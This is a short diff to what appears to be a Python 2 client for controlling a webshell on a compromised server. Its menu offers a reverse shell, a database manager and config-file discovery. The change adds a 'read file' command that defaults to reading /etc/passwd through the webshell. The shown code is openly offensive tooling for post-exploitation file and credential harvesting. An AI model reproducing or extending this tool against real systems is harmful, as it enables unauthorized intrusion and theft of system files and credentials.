@@ -27,6 +27,7 @@ def main_help():
     print "        2. [rsh|rshell] : start an reverse shell"
     print "        3. [db|database] : database manager"
     print "        4. [c|config] : find the config files"
+    print "        4. [r|read] : read file"
     print "        5. [q|quit|exit] : quit"
 
 def main():
@@ -60,6 +61,9 @@ def main():
         elif context == "c" or context == "config":
             Log.info("Detacting config files...")
             webshell.get_config_file()
+        elif context == "r" or context == "read":
+            filepath = raw_input("Input file path (/etc/passwd) : ") or "/etc/passwd"
+            webshell.read_file(filepath)
         elif context == "db" or context == "database":
             ip = raw_input("IP (127.0.0.1): ") or "127.0.0.1"
             username = raw_input("Username (root): ") or "root"
